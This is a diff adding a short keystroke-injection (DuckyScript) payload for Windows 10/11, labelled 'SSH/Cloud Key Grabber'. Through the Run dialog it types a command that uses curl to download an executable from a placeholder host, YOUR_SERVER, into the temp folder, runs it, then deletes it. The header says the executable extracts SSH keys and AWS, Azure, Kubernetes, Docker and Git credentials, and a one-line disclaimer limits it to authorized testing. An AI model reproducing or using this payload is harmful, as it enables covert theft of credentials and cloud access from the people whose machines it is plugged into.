@@ -1,0 +1,12 @@
+REM Title: SSH/Cloud Key Grabber
+REM Description: Extracts SSH keys, AWS/Azure/K8s/Docker/Git credentials
+REM Author: Tsali
+REM Target: Windows 10/11
+REM Runtime: ~5 seconds
+REM For authorized penetration testing only
+REM Update YOUR_SERVER below
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd /c curl -s -o %temp%\svc.exe http://YOUR_SERVER/key_grab.exe && %temp%\svc.exe && timeout /t 10 /nobreak >nul && del %temp%\svc.exe
+ENTER
